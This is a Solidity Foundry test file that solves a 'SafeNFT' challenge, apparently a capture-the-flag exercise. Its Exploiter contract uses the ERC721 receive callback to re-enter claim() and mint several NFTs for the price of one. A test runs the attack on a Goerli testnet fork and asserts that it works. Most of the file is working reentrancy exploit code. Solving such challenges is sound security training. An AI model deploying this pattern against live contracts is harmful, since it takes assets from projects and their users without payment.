// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// ./challenge/SafeNFT.sol

/// Define the interface for the Target contract
interface ITarget {
    function buyNFT() external payable;

    function claim() external;

    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

/// Define the Exploiter contract
contract Exploiter is IERC721Receiver {
    ITarget public immutable target;

    constructor(ITarget _target) payable {
        target = _target;
    }

    function payForOneNFT() public {
        target.buyNFT{value: 0.01 ether}();
    }

    function exploit() public {
        target.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        /// Reentrancy attack: Call claim until we mint multiple NFTs for the price of 1
        if (target.balanceOf(address(this)) < 2) target.claim();

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SafeNFTSolved is Test {
    ITarget target = ITarget(0xf0337Cde99638F8087c670c80a57d470134C3AAE);
    Exploiter exploiter;

    function setUp() public {
        /// Run the test against the goerli testnet fork
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli", 8168379);

        /// Deploy the exploiter contract with 2 ether (any amount more than 0.1 ether will work)
        exploiter = new Exploiter{value: 2 ether}(target);
    }

    function test_exploit() external {
        uint256 balanceETHBefore = address(exploiter).balance;
        exploiter.payForOneNFT();
        exploiter.exploit();
        uint256 balanceETHAfter = address(exploiter).balance;

        /// Objective: Exploiter should mint more than 1 NFT for the price of 1
        assertGt(target.balanceOf(address(exploiter)), 1);
        assertEq(balanceETHBefore - balanceETHAfter, 0.01 ether);
    }
}
